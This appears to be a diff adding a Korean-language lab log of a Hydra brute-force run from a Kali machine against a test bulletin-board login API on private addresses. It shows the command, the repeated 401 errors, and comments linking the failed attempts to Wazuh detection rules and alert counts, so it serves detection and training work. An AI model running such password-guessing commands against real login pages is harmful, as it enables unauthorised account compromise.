@@ -1,0 +1,17 @@
+# [④ 브루트포스] Hydra 실행 콘솔 (실제 출력)
+# Kali 172.17.144.170 → 게시판 172.17.144.1:5000
+
+$ hydra -l wz_test -P wzpass.txt -s 5000 172.17.144.1 \
+        http-post-form "/api/auth/login:username=^USER^&password=^PASS^:msg" -t 4 -I
+
+[ERROR] received HTTP error code 401. The target may be using HTTP auth, not a web form.  Use module "http-get" instead, or set "1=".
+[ERROR] received HTTP error code 401. The target may be using HTTP auth, not a web form.  Use module "http-get" instead, or set "1=".
+[ERROR] received HTTP error code 401. The target may be using HTTP auth, not a web form.  Use module "http-get" instead, or set "1=".
+...(동일 반복)...
+
+# 교재와 동일: 게시판은 로그인 실패 시 HTTP 401 을 반환하므로 hydra 가 401 ERROR 를
+# 출력한다. 그래도 '시도 자체'는 모두 전송되어 security.log 에 login_failed 로 기록되고,
+# 이것이 Wazuh 탐지(100210/100211)의 입력이 된다.
+#
+# 누적 wz_test 로그인 실패(src 172.17.144.170): 2560 건
+# → Wazuh rule 100211(브루트포스, L10, T1110) 354건 발동 (evidence_alerts.txt)
